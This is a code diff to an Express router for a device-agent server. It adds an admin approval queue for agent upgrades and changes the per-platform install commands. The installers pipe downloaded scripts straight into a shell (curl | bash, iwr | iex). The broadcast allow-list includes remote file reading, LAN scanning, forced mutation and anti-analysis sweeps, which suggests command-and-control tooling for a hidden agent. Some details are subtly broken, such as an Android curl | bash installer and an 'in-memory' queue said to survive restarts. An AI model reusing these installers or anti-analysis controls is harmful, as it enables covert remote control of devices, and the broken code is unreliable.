@@ -134,8 +134,10 @@ router.post("/devices/enroll", authRequired, (req, res) => {
     installCommands: {
       linux:   `curl -sSL ${enrollUrl} | bash`,
       macos:   `curl -sSL ${enrollUrl} | bash`,
-      windows: `powershell -c "iwr ${enrollUrl} | iex"`,
-      android: `adb install -r bixtx-agent.apk && adb shell am start -n ai.bixtx.agent/.EnrollActivity --es key ${ENROLL_KEY}`,
+      windows: `powershell -c "iwr '${enrollUrl}' | iex"`,
+      android: `curl -sSL ${enrollUrl} | bash`,
+      ios:     `open '${enrollUrl}'`,
+      harmony: `hdc app install -r bixtx-agent.hap && hdc shell aa start -b ai.bixtx.agent -a EntryAbility -p key=${ENROLL_KEY}`,
     },
   });
 });
@@ -200,6 +202,8 @@ router.post("/devices/broadcast/cmd", authRequired, (req, res) => {
     "FILE_READ", "LAN_SCAN", "MODULE_TOGGLE", "UPDATE", "KILL", "REBOOT", "PING",
     "DEPLOY_JOB", "MDM_POLICY_PUSH", "FORCE_MUTATE", "WATCHDOG_STATUS",
     "GUARD_THREAT_LOG", "ANTIANALYSIS_STATUS", "ANTIANALYSIS_SWEEP",
+    "UPGRADE_ENV_REQUEST", "UPGRADE_PROPOSAL_REQUEST", "UPGRADE_STATUS",
+    "UPGRADE_APPROVED", "UPGRADE_DENIED",
   ];
   if (!ALLOWED_CMDS.includes(type)) {
     return res.status(400).json({ error: `Unknown command: ${type}` });
@@ -214,6 +218,82 @@ router.post("/devices/broadcast/cmd", authRequired, (req, res) => {
   res.json({ ok: true, type, results, total: targets.length, dispatched: results.filter(r => r.sent).length });
 });
 
+// ── Upgrade approval queue (in-memory; survives server restarts via wsHandler) ──
+const upgradeQueue = new Map(); // requestId → { request, status, adminId, ts }
+
+// Agents push UPGRADE_PROPOSAL messages over WebSocket; the WS handler calls this
+// to enqueue them so admins can see and act on them via REST.
+function enqueueUpgradeProposal(deviceId, proposal) {
+  const id = `upg-${deviceId}-${Date.now()}`;
+  upgradeQueue.set(id, {
+    id,
+    deviceId,
+    fromVersion: proposal.fromVersion,
+    toVersion:   proposal.toVersion,
+    reason:      proposal.reason,
+    envStatus:   proposal.envStatus || null,
+    status:      "pending",
+    requestedAt: Date.now(),
+  });
+  logger.info(`[Upgrades] Proposal queued: ${id} ${deviceId} → v${proposal.toVersion}`);
+  return id;
+}
+// Exported at module.exports.enqueueUpgradeProposal below — call from WS handler
+// when an UPGRADE_PROPOSAL frame arrives from an agent.
+
+// GET /v1/upgrades — list all upgrade requests (filter by ?status=pending|approved|denied)
+router.get("/upgrades", authRequired, (req, res) => {
+  const { status } = req.query;
+  let items = Array.from(upgradeQueue.values());
+  if (status) items = items.filter(r => r.status === status);
+  items.sort((a, b) => b.requestedAt - a.requestedAt);
+  res.json({ upgrades: items, total: items.length });
+});
+
+// POST /v1/upgrades/:id/approve — admin approves; forwards UPGRADE_APPROVED to agent
+router.post("/upgrades/:id/approve", authRequired, (req, res) => {
+  const entry = upgradeQueue.get(req.params.id);
+  if (!entry) return res.status(404).json({ error: "Upgrade request not found" });
+  if (entry.status !== "pending") return res.status(409).json({ error: `Request is already ${entry.status}` });
+
+  entry.status  = "approved";
+  entry.adminId = req.admin.id;
+  entry.decidedAt = Date.now();
+
+  const sent = wsHandler.sendToAgent(entry.deviceId, "UPGRADE_APPROVED", {
+    requestId: entry.id,
+    version:   entry.toVersion,
+    approvedBy: req.admin.email,
+    ts: Date.now(),
+  });
+
+  logger.info(`[Upgrades] ${entry.id} approved by ${req.admin.email}, agent notified: ${sent}`);
+  res.json({ ok: true, entry, agentNotified: sent });
+});
+
+// POST /v1/upgrades/:id/deny — admin denies; forwards UPGRADE_DENIED to agent
+router.post("/upgrades/:id/deny", authRequired, (req, res) => {
+  const entry = upgradeQueue.get(req.params.id);
+  if (!entry) return res.status(404).json({ error: "Upgrade request not found" });
+  if (entry.status !== "pending") return res.status(409).json({ error: `Request is already ${entry.status}` });
+
+  const reason = req.body?.reason || "Denied by administrator";
+  entry.status    = "denied";
+  entry.adminId   = req.admin.id;
+  entry.decidedAt = Date.now();
+  entry.denyReason = reason;
+
+  const sent = wsHandler.sendToAgent(entry.deviceId, "UPGRADE_DENIED", {
+    requestId: entry.id,
+    reason,
+    deniedBy: req.admin.email,
+    ts: Date.now(),
+  });
+
+  logger.info(`[Upgrades] ${entry.id} denied by ${req.admin.email}: ${reason}`);
+  res.json({ ok: true, entry, agentNotified: sent });
+});
+
 // ── GET /v1/stats ──────────────────────────────────────────────────────────
 router.get("/stats", authRequired, (req, res) => {
   const devices = store.devices.getAll();
@@ -225,3 +305,4 @@ router.get("/stats", authRequired, (req, res) => {
 });
 
 module.exports = router;
+module.exports.enqueueUpgradeProposal = enqueueUpgradeProposal;
